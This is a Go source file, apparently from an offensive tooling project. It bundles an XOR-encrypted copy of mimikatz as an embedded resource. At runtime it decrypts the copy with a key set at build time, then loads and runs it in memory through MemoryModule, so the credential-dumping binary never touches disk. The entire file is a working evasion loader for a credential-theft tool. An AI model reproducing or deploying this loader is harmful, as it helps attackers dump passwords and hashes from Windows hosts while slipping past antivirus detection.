// +build !pack

package main

/*
#cgo CFLAGS: -IMemoryModule
#include "../../MemoryModule/MemoryModule.h"
*/
import "C"

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"unsafe"

	"github.com/markbates/pkger"
)

var key string

func exec(data []byte) {
	// convert the args passed to this program into a C array of C strings
	var cArgs []*C.char
	for _, goString := range os.Args {
		cArgs = append(cArgs, C.CString(goString))
	}

	// load the mimikatz reconstructed binary from memory
	handle := C.MemoryLoadLibraryEx(
		unsafe.Pointer(&data[0]),                  // void *data
		(C.size_t)(len(data)),                     // size_t
		(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
		(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
		unsafe.Pointer(&cArgs[0]),                 // void *userdata
	)

	// run mimikatz
	C.MemoryCallEntryPoint(handle)

	// cleanup
	C.MemoryFreeLibrary(handle)
}

func decrypt(data []byte) (ret []byte) {
	decryptionKey := []byte(key)
	keLen := len(decryptionKey)
	ret = make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		ret[i] = data[i] ^ decryptionKey[i%keLen]
	}
	return
}

func loadRes() (ret []byte, err error) {
	resourceFile, err := pkger.Open("/resources/mimikatz.exe.enc")
	if err != nil {
		return
	}
	fmt.Printf("Loaded res: %s\n", resourceFile.Name())
	defer resourceFile.Close()
	ret, err = ioutil.ReadAll(resourceFile)
	return
}

func main() {
	res, err := loadRes()
	if err != nil {
		log.Fatal(err)
	}
	data := decrypt(res)
	exec(data)
}
